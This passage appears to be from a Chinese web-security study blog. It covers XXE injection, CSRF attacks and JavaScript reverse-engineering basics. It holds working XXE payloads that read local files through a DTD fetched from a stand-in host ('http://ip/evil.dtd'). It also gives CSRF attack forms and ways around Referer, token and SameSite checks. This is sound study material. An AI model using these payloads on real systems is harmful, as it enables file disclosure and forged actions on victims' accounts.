<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">pass</span>&gt;</span>mypass<span class="hljs-tag">&lt;/<span class="hljs-name">pass</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br><br></code></pre></td></tr></table></figure>

<p><strong>补充一下</strong>  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY   &gt;</span><br></code></pre></td></tr></table></figure>

<p>在这里面定义实体  </p>
<p>内部实体是在DTD内部定义的，其内容直接在DTD中指定。  </p>
<p>外部实体是从外部文件中获取内容的实体。  </p>
<h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><p>外部实体主要有两种类型：</p>
<ol>
<li><strong>通用外部实体（General External Entity）</strong>： 这是最常见的外部实体类型，它通过PUBLIC或SYSTEM关键字来声明。</li>
<li><strong>参数实体（Parameter Entity）</strong>： 参数实体仅在DTD内部使用，用于DTD中的宏定义或条件包含</li>
</ol>
<hr>
<p>实体实际上可以从外部的 dtd 文件中引用  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;ISO-8859-1&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///c:/test.dtd&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">pass</span>&gt;</span>mypass<span class="hljs-tag">&lt;/<span class="hljs-name">pass</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>这样显得非常方便 因为每次加载都会读取新的dtd文件 从而实现自动更新  </p>
<p>还有一种引用方式是使用 引用<strong>公用 DTD</strong> 的方法  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素名称 <span class="hljs-keyword">PUBLIC</span> “DTD标识名” “公用DTD的URI”&gt;</span> <br></code></pre></td></tr></table></figure>

<h3 id="通用实体和参数实体"><a href="#通用实体和参数实体" class="headerlink" title="通用实体和参数实体"></a>通用实体和参数实体</h3><p>另外的分法  </p>
<h4 id="通用实体"><a href="#通用实体" class="headerlink" title="通用实体"></a>通用实体</h4><p>用 <code>&amp;实体名; </code>引用的实体，他在DTD 中定义，在 XML 文档中引用  </p>
<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202502161533339.png" srcset="/img/loading.gif" lazyload alt="image-20250216153301128"></p>
<h4 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h4><p><strong>参数实体</strong>是通过使用 <code>&lt;!ENTITY %&gt;</code> 语法定义的实体。它们与普通实体的区别在于，<strong>参数实体只能在 DTD 中引用</strong>，并且可以通过 <code>&lt;!ENTITY % entityName &quot;content&quot;&gt;</code> 定义。</p>
<p>(1)使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong><br>(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>(3)和通用实体一样，参数实体也可以外部引用</p>
<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202502161501100.png" srcset="/img/loading.gif" lazyload alt="image-20250216150105839"></p>
<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">an-element</span> <span class="hljs-string">&quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote-dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://somewhere.example.org/remote.dtd&quot;</span>&gt;</span> </span><br><span class="language-xml"></span><span class="language-perl"><span class="hljs-variable">%an</span>-element; <span class="hljs-variable">%remote</span>-dtd;</span><br></code></pre></td></tr></table></figure>

<h3 id="简单利用-2"><a href="#简单利用-2" class="headerlink" title="简单利用"></a>简单利用</h3><p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202502161541403.png" srcset="/img/loading.gif" lazyload alt="image-20250216154142930"></p>
<p>能直接读取出来文件里面的内容   </p>
<h3 id="文件里面有特殊字符"><a href="#文件里面有特殊字符" class="headerlink" title="文件里面有特殊字符"></a>文件里面有特殊字符</h3><p>例如  </p>
<p>“&lt;,&gt;,&amp;”  </p>
<h4 id="PCDATA-和-CDATA"><a href="#PCDATA-和-CDATA" class="headerlink" title="PCDATA 和 CDATA"></a>PCDATA 和 CDATA</h4><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/256728.html">https://www.freebuf.com/articles/web/256728.html</a>  </p>
<p>可以参考这篇文章  </p>
<p>例子 :  </p>
<p>例如 想要读取test.txt 这个文件下的东西 但是有特殊字符  </p>
<p>payload:  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">roottag</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">start</span> <span class="hljs-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span>   </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">goodies</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///d:/test.txt&quot;</span>&gt;</span>  </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">end</span> <span class="hljs-string">&quot;]]&gt;&quot;</span>&gt;</span>  </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://ip/evil.dtd&quot;</span>&gt;</span> </span><br><span class="hljs-meta">%dtd; ]&gt;</span> <br><br><span class="hljs-tag">&lt;<span class="hljs-name">roottag</span>&gt;</span><span class="hljs-symbol">&amp;all;</span><span class="hljs-tag">&lt;/<span class="hljs-name">roottag</span>&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span> <br><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">all</span> <span class="hljs-string">&quot;%start;%goodies;%end;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h3 id="如何外带"><a href="#如何外带" class="headerlink" title="如何外带"></a>如何外带</h3><h1 id="csrf攻击"><a href="#csrf攻击" class="headerlink" title="csrf攻击"></a>csrf攻击</h1><p><a target="_blank" rel="noopener" href="https://juejin.cn/post/7031060650801496101#heading-5">https://juejin.cn/post/7031060650801496101#heading-5</a>  </p>
<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/7008171429845811207">https://juejin.cn/post/7008171429845811207</a>  </p>
<p>跨站请求伪造（英语：Cross-site request forgery）是一种对网站的恶意利用，也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法  </p>
<p>攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。</p>
<h4 id="典型的攻击流程"><a href="#典型的攻击流程" class="headerlink" title="典型的攻击流程"></a><strong>典型的攻击流程</strong></h4><ol>
<li><strong>受害者登录受信任网站 A</strong>，并生成了有效的会话凭证（如 Cookie）。</li>
<li>攻击者通过多种手段（如发送钓鱼邮件、诱导点击恶意链接等）诱骗受害者访问攻击者设计的网站 B。</li>
<li>网站 B 隐含了请求网站 A 的恶意操作，比如提交表单或发送数据。</li>
<li>浏览器会自动携带网站 A 的 Cookie（包括身份验证凭证），使得网站 A 无法区分请求是用户主动操作还是攻击者伪造的请求。</li>
<li>恶意请求被网站 A 执行，造成用户数据泄露或操作被篡改。</li>
</ol>
<h3 id="session和cookie"><a href="#session和cookie" class="headerlink" title="session和cookie"></a>session和cookie</h3><p>简单来说因为http协议是无会话的 为了跟踪用户的整个会话 通常使用cookie和session这两者方法  </p>
<p><strong>一个用户的所有请求操作都应该属于同一个会话</strong>，而另一个用户的所有请求操作则应该属于另一个会话，二者不能混淆。例如，用户A在超市购买的任何商品都应该放在A的购物车内，不论是用户A什么时间购买的，这都是属于同一个会话的，不能放入用户B或用户C的购物车内，这不属于同一个会话。</p>
<p>而Web应用程序是使用HTTP协议传输数据的。<strong>HTTP协议是无状态的协议。一旦数据交换完毕，客户端与服务器端的连接就会关闭，再次交换数据需要建立新的连接。这就意味着服务器无法从连接上跟踪会话</strong>。即用户A购买了一件商品放入购物车内，当再次购买商品时服务器已经无法判断该购买行为是属于用户A的会话还是用户B的会话了。要跟踪该会话，必须引入一种机制。</p>
<p>Cookie 是存储在客户端（用户浏览器）中的一小段数据，由服务器生成并发送给客户端。每次客户端向同一服务器发送请求时，都会自动携带相应的 Cookie，帮助服务器识别客户端或保存状态信息  </p>
<p>Session 是存储在服务器端的一种机制，用于跟踪用户会话信息。服务器为每个用户会话分配一个唯一的标识符（Session ID），客户端通过 Cookie 或 URL 参数将此 ID 发送回服务器，从而关联用户的会话数据。 </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/gaoyong_stone/article/details/79524321">https://blog.csdn.net/gaoyong_stone/article/details/79524321</a>  </p>
<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol>
<li>登录受信任网站A，并在本地生成Cookie。</li>
<li>在不登出A的情况下，访问危险网站B。</li>
</ol>
<h3 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h3><p><strong>get型</strong>  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://wooyun.org/csrf?xx</span>=<span class="hljs-string">11</span> /&gt;</span> <br></code></pre></td></tr></table></figure>

<p><strong>post</strong>  </p>
<p>通常使用一个自动提交的表单  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">http://wooyun.org/csrf.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">POST</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;xx&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;11&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"> <span class="hljs-variable language_">document</span>.<span class="hljs-property">forms</span>[<span class="hljs-number">0</span>].<span class="hljs-title function_">submit</span>(); </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <br><br></code></pre></td></tr></table></figure>

<h4 id="如何判断"><a href="#如何判断" class="headerlink" title="如何判断"></a>如何判断</h4><p>至于怎么样判断存不存在CSRF，其实有一个非常简单暴力的方法，只要操作点不存在CSRF_Token（Token）、Referer来源检测或者不存在其它判断数据包有效性的机制，那么就必然会存在CSRF漏洞，并且顺便一提，很多站点的CSRF漏洞是整站性的，就是只要一处没做CSRF防护，基本上可以说明整站都没做CSRF防护，相应的，有一处做了CSRF防护，基本可以说明整站都有数据包有效性校验  </p>
<h3 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h3><p>在讨论如何抵御 CSRF 之前，先要明确 CSRF 攻击的对象，也就是要保护的对象。  </p>
<p>CSRF 攻击是黑客借助受害者的 cookie（session） 骗取服务器的信任，但是黑客并不能拿到 cookie，也看不到 cookie 的内容。另外，对于服务器返回的结果，由于浏览器同源策略的限制，黑客也无法进行解析。因此，黑客无法从返回的结果中得到任何东西，<strong>他所能做的就是给服务器发送请求，以执行请求中所描述的命令，在服务器端直接改变数据的值，而非窃取服务器中的数据</strong>。所以，我们要保护的对象是那些可以直接产生数据改变的服务，而对于读取数据的服务，则不需要进行 CSRF 的保护。比如银行系统中转账的请求会直接改变账户的金额，会遭到 CSRF 攻击，需要保护。而查询余额是对金额的读取操作，不会改变数据，CSRF 攻击无法解析服务器返回的结果，无需保护。</p>
<p><strong>故：增删改需要防范CSRF攻击，而读（即读数据库）无需防范。</strong></p>
<h4 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF-Token"></a>CSRF-Token</h4><p>在生成数据包的时候，会往数据包里塞一个唯一的不可重复的值，如果说数据包里没有这个值，或者它已经被使用过了，那么这个数据包就是无效的，简单来说，它实现的效果就是一个Token对应一个数据包  </p>
<p>一个很简单且致命的错误就是，CSRF-Token和用户进行绑定，是静态的，不变的。那我们可以试试在用户A操作的时候抓包，获取一个CSRF-Token，然后在用户B尝试使用这个CSRF-Token，观察是否有效  </p>
<p>另外一个很蠢的错误就是，开发只校验CSRF-Token的长度是否达标。比方说一个32位的CSRF-Token ud019eh10A23C132a1234。那么可以试试换成相同长度、相同规律的另外一个ab123cd12B23Q023c1574  </p>
<p>……  </p>
<h4 id="针对于目标防御机制是以-Referer-和-Origin为核心的"><a href="#针对于目标防御机制是以-Referer-和-Origin为核心的" class="headerlink" title="针对于目标防御机制是以 Referer 和 Origin为核心的"></a>针对于目标防御机制是以 <code>Referer</code> 和 <code>Origin</code>为核心的</h4><p>**不仅仅只能运用到csrf的防御当中 只要是以这两个技术为防御中心的 都可以尝试去使用  **  </p>
<p>可以先回顾一下两者的区别  </p>
<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202502042305043.png" srcset="/img/loading.gif" lazyload alt="image-20250204230514835"></p>
<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202502042305883.png" srcset="/img/loading.gif" lazyload alt="image-20250204230542546"></p>
<h5 id="如何绕过"><a href="#如何绕过" class="headerlink" title="如何绕过"></a>如何绕过</h5><p>下面这些方法能绕过的原理都是基于referer判断的方式存在问题  </p>
<p>或者说是正则匹配有问题  </p>
<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202502091357373.png" srcset="/img/loading.gif" lazyload alt="image-20250209135756965"></p>
<p>但是上面的这一切都没有讨论到referer为空的情况  </p>
<p>如果开发人员不专门写个逻辑来讨论Referer为空的情况，Referer机制就会被绕过</p>
<p>所以说<strong>实战中最好用的方法</strong>就是在payload里面添加  </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;referrer&quot;</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;never&quot;</span>&gt;<br></code></pre></td></tr></table></figure>

<h3 id="Same-site-cookie"><a href="#Same-site-cookie" class="headerlink" title="Same-site cookie"></a>Same-site cookie</h3><p>Cookie 的<code>SameSite</code>属性  </p>
<ul>
<li>Strict</li>
<li>Lax</li>
<li>None</li>
</ul>
<p>是在跨站点的时候使用  </p>
<p>也就是跨site的时候使用  </p>
<p>同site: 相同协议 相同域名 端口不需要相同  </p>
<p><strong>SameSite&#x3D;Strict</strong></p>
<ul>
<li>这是最严格的设置，只有 <strong>同源请求</strong> 才会携带 Cookie。</li>
<li>当 <code>SameSite=Strict</code> 时，<strong>在跨站点（即不同域名或不同站点）请求中，Cookie 是不会被发送的</strong>，即使用户已经登录了。</li>
<li>只有当请求来自当前站点的页面时（即同源），浏览器才会发送 Cookie。</li>
</ul>
<p><strong>SameSite&#x3D;Lax</strong></p>
<ul>
<li><code>SameSite=Lax</code> 是一个稍微宽松的设置，在大多数正常情况下，它会允许跨站点请求携带 Cookie，但对一些不安全的行为进行限制。</li>
<li><strong>跨站点导航时</strong>（例如点击链接从站点 A 跳转到站点 B），<strong>Cookie 会被发送</strong>，但 <strong>跨站点的时候是采用的 <code>POST</code> 请求或其他带有敏感操作的请求（如表单提交）不会发送 Cookie</strong>。</li>
</ul>
<p><strong>SameSite&#x3D;None</strong></p>
<ul>
<li><code>SameSite=None</code> 允许 <strong>跨站点请求</strong> 中发送 Cookie，但为了更安全，浏览器要求 <code>SameSite=None</code> 必须与 <code>Secure</code> 一起使用（即要求 Cookie 只能通过 HTTPS 发送）。</li>
<li><code>SameSite=None</code> 用于允许跨站点请求时也能携带 Cookie，适用于需要跨站点身份验证的场景，如嵌入式内容、第三方广告等。</li>
</ul>
<p>在2019 年10 月的时候，Chrome 直接发布了一篇名为<a target="_blank" rel="noopener" href="https://blog.chromium.org/2019/10/developers-get-ready-for-new.html">Developers: Get Ready for New SameSite&#x3D;None; Secure Cookie Settings</a>的文章，宣布从2020 年2 月开始，没有设定SameSite 属性的cookie，预设一律会是Lax。 </p>
<h4 id="SameSite-Lax-的绕过"><a href="#SameSite-Lax-的绕过" class="headerlink" title="SameSite&#x3D;Lax 的绕过"></a>SameSite&#x3D;Lax 的绕过</h4><p>上面讲到 这种模式能有效的避免 cookie在跨站点并且执行post请求之类的带有敏感操作的请求时发送  </p>
<p>但是，存在一个漏洞。许多Web开发框架支持服务器端的HTTP方法的覆盖。  </p>
<p>可以利用这个覆盖去将post请求覆盖为get请求 从而避免cookie无法携带  </p>
<p>详细解释请看下面的文章  </p>
<p><a target="_blank" rel="noopener" href="https://hazanasec.github.io/2023-07-30-Samesite-bypass-method-override.md/">https://hazanasec.github.io/2023-07-30-Samesite-bypass-method-override.md/</a>  </p>
<p><strong>还有一个比较少人知道的规则</strong>  </p>
<p>Firefox 和 Chrome 实现了一个“宽松”机制，即对于没有 <code>SameSite</code> 属性的 cookie，在它们被创建后的前两分钟内，浏览器允许这些 cookie 参与跨站点的 POST 请求，即使这些请求是“顶级跨站点 POST 请求”（例如，一个表单提交）。这个机制通常用于登录过程，在这种情况下，用户可能会通过一个跨站点的登录表单提交数据。  </p>
<p>也就是说  </p>
<p>时间差!!!  </p>
<h4 id="一些小技巧"><a href="#一些小技巧" class="headerlink" title="一些小技巧"></a>一些小技巧</h4><p><strong>一篇好文章</strong>  </p>
<p><a target="_blank" rel="noopener" href="http://www.mi1k7ea.com/2020/01/21/CSRF-Tricks%E5%B0%8F%E7%BB%93/">http://www.mi1k7ea.com/2020/01/21/CSRF-Tricks%E5%B0%8F%E7%BB%93/</a>  </p>
<p>展示了csrf攻击的各种小trick  </p>
<p>例如 get类型的csrf除了能直接发给用户点击 或者通过表单来自动提交(间接的点击)  </p>
<p>利用iframe标签来引入CSRF攻击页面，让CSRF攻击过程都不直接在页面中显现，一切都隐藏在页面中悄悄进行，不易被受害者发现  </p>
<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202502091517277.png" srcset="/img/loading.gif" lazyload alt="image-20250209151749082">  </p>
<p>这里用到的知识是这些标签里面的src属性不受sop政策的影响  </p>
<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202502091518873.png" srcset="/img/loading.gif" lazyload alt="image-20250209151847524"></p>
<p>也就是说，<strong>即使资源被跨域加载了，JavaScript 也无法直接读取它们的内容</strong>。  </p>
<p>例如：</p>
<ul>
<li>不能读取<strong>跨域图片的像素数据</strong>。</li>
<li>不能读取<strong>跨域 <code>iframe</code> 里的 HTML</strong>。</li>
<li>不能读取<strong>跨域 CSS 样式内容</strong>。</li>
</ul>
<h1 id="js逆向"><a href="#js逆向" class="headerlink" title="js逆向"></a>js逆向</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sbhglqy/p/18162365">https://www.cnblogs.com/sbhglqy/p/18162365</a>  </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/biggbang/category_12099075.html">https://blog.csdn.net/biggbang/category_12099075.html</a>  </p>
<h3 id="逆向目标"><a href="#逆向目标" class="headerlink" title="逆向目标"></a>逆向目标</h3><p><strong>分析、理解并还原被混淆、加密或隐藏的 JavaScript 代码逻辑</strong>，从而破解前端保护机制或实现特定功能。  </p>
<p>通过本地运行js代码 达到脱离浏览器后 能够实现和浏览器上运行加密js的效果。</p>
<p>网站上完全都是JavaScript实现的加密，我们的目的要知道加密的整个过程，并且本地实现这个加密的过程，拿到和浏览器一样的加密的结果。</p>
<p>得到加密的结果之后就可以跳过浏览器，本地直接给服务器发送加密数据，从而直接获取服务器响应的结果。</p>
<h3 id="常见的断点"><a href="#常见的断点" class="headerlink" title="常见的断点"></a>常见的断点</h3><h4 id="dom断点"><a href="#dom断点" class="headerlink" title="dom断点"></a>dom断点</h4><p>在某个特定的DOM元素上设置了一个<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%96%AD%E7%82%B9&spm=1001.2101.3001.7020">断点</a>。一旦该元素被修改、删除或者属性发生变化，断点就会触发，浏览器会暂停执行JavaScript代码，使你能够检查变化的内容、调试代码或者分析程序行为  </p>
<p>右击dom元素来下</p>
<h4 id="普通的断点"><a href="#普通的断点" class="headerlink" title="普通的断点"></a>普通的断点</h4><p>普通断点是<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B&spm=1001.2101.3001.7020">调试过程</a>中设置的一种基本断点，它在代码执行到指定位置时会触发程序的暂停。当程序执行到设定的普通断点时，调试器会停止执行代码，并允许开发者查看当前代码的状态、变量的值以及程序执行的上下文。  .</p>
<p>直接点一下侧边对应的行就行  </p>
<h4 id="事件监听断点"><a href="#事件监听断点" class="headerlink" title="事件监听断点"></a>事件监听断点</h4><p>事件监听断点（Event Listener Breakpoints）用于监听某些特定事件触发时暂停执行 JavaScript 代码，可以用于调试鼠标点击、键盘输入、触摸等事件的监听处理逻辑  </p>
<p>选中某个类别的事件（比如 <code>Mouse</code> → <code>click</code>），代码在 <code>click</code> 事件触发时会自动暂停  </p>
<h4 id="全局监听器"><a href="#全局监听器" class="headerlink" title="全局监听器"></a>全局监听器</h4><p>全局监听器用于显示 <strong>注册在 <code>window</code>、<code>document</code>、<code>body</code> 等全局对象上的事件监听器</strong>。  </p>
<p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202503111106530.png" srcset="/img/loading.gif" lazyload alt="image-20250311110612284"></p>
<p> <strong>帮助你找到代码里有哪些事件被监听了，以及它们是在哪个文件的哪一行被注册的</strong>。</p>
<h4 id="xhr断点"><a href="#xhr断点" class="headerlink" title="xhr断点"></a>xhr断点</h4><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Kh411r7uR?spm_id_from=333.788.videopod.episodes&vd_source=9dc7cf47e7dcff03c97cf24d47cc3388&p=9">9.方法栈是什么_哔哩哔哩_bilibili</a>  </p>
<p>建议看视频  </p>
<p>以及其他的断点  </p>
<h3 id="跟值"><a href="#跟值" class="headerlink" title="跟值"></a>跟值</h3><p><img src="https://yxy2024.oss-cn-chengdu.aliyuncs.com/image202503091911229.png" srcset="/img/loading.gif" lazyload alt="image-20250309191123005"></p>
<p>黄色的部分为智能提示 按下ctrl键能看见  </p>
<p>一个方法一直往上翻 翻到没有智能提示的时候 就是这个方法的开始  </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/biggbang/article/details/127873089?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522e46913a21d5c736de396cc2ab3c72319%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=e46913a21d5c736de396cc2ab3c72319&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-8-127873089-null-null.nonecase&utm_term=js%E9%80%86%E5%90%91&spm=1018.2226.3001.4450">https://blog.csdn.net/biggbang/article/details/127873089?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522e46913a21d5c736de396cc2ab3c72319%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=e46913a21d5c736de396cc2ab3c72319&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-8-127873089-null-null.nonecase&amp;utm_term=js%E9%80%86%E5%90%91&amp;spm=1018.2226.3001.4450</a>   </p>
<h3 id="常见的加密解密"><a href="#常见的加密解密" class="headerlink" title="常见的加密解密"></a>常见的加密解密</h3><h4 id="补充一下"><a href="#补充一下" class="headerlink" title="补充一下"></a>补充一下</h4><p><strong>js里面的this关键字</strong>  </p>
<p><code>this</code> 是 JavaScript 中的一个特殊关键字，它的值取决于<strong>函数被调用的方式</strong>，而不是函数本身的定义位置。在不同的上下文（Context）下，<code>this</code> 可能指向不同的对象  </p>
<p><strong>1️⃣ <code>this</code> 在全局作用域</strong></p>
<p>在全局作用域（即代码没有在任何函数内），<code>this</code> 代表全局对象：</p>
<ul>
<li>在 <strong>浏览器</strong> 中，全局对象是 <code>window</code>。</li>
<li>在 <strong>Node.js</strong> 中，全局对象是 <code>global</code>（严格模式下是 <code>undefined</code>）。</li>
</ul>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(this);  <span class="hljs-comment">// 浏览器中: window</span><br>                    <span class="hljs-comment">// Node.js 中: global</span><br></code></pre></td></tr></table></figure>

<p><strong>2️⃣ <code>this</code> 在对象方法中</strong></p>
<p>如果 <code>this</code> 被用在对象的方法中，它通常指向<strong>调用该方法的对象</strong>。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> obj = &#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Alice&quot;</span>,<br>    <span class="hljs-attr">greet</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Hello, &quot;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>    &#125;<br>&#125;;<br><br>obj.<span class="hljs-title function_">greet</span>();  <span class="hljs-comment">// 输出: Hello, Alice</span><br></code></pre></td></tr></table></figure>

<p><code>this.name</code> 取的是 <code>obj</code> 里面的 <code>name</code> 属性，因为 <code>greet</code> 方法是 <code>obj</code> 调用的。</p>
<p>此时this代表 obj这个对象  </p>
<p>3️⃣ <code>this</code> 在构造函数中</p>
